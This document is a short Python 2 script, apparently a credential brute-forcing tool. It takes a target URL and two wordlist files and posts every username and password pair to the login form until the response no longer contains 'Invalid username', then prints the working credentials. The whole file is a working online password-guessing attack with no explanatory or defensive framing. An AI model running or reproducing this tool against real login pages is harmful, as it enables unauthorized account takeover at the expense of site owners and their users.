import requests
import sys

target_url = sys.argv[1]
logins = sys.argv[2]
passwords = sys.argv[3]

f = open(logins, 'r')
logins = f.read()
f.close()

f = open(passwords, 'r')
passwords = f.read()
f.close()

brk = False

for line in logins.splitlines():
	login = line.strip('\n')
	for line2 in passwords.splitlines():
		passw = line2.strip('\n')
		req = requests.post(target_url, data={'username':login, 'password':passw})
		if "Invalid username" not in req.text:
			print "\n\t\tFound the correct credentials --> Login: \033[44;97m" + login + "\033[49;39m\t Password:\033[41;97m" + passw + "\033[49;39m\n"
			brk = True
			break
		else:
			print "Incorrect credentials --> Login: " + login + "\t Password:" + passw
	if brk:
		break
